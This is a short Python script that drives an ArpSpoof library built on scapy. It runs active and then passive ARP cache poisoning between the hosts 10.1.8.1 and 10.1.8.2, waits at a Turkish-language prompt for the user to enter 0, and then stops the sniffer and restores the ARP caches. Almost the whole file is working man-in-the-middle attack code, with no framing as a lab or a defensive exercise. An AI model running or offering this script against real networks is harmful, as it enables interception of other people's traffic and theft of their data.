from ArpSpoof import SpooferARP
from scapy.all import conf

spoofer = SpooferARP('10.1.8.1', '10.1.8.2 ')
spoofer.active_cache_poisonning()

spoofer = SpooferARP('10.1.8.1 ', '10.1.8.2 ', conf.iface, False, 0.5)
spoofer.passive_cache_poisonning(asynchronous=True)

while True:
    secim = input("Çıkmak için 0 girin: ")
    if secim == '0':
        break

spoofer.run = False
spoofer.sniffer.stop()
spoofer.restore()
